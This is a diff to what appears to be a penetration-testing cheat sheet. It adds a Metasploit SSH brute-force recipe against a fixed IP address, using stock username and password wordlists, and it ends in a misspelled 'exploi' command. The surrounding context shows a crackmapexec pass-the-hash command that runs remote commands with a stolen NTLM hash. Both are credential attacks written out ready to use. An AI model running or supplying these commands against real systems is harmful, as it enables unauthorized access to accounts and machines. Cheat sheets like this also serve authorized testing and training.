@@ -268,6 +268,18 @@ crackmapexec smb IP -u Username -H "NTLMHASH" -x "commands"
 ```
 
 
+## SSH LOGIN
+```
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.245.211.3
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploi
+```
+
+
 
 ## SUID 
 ```
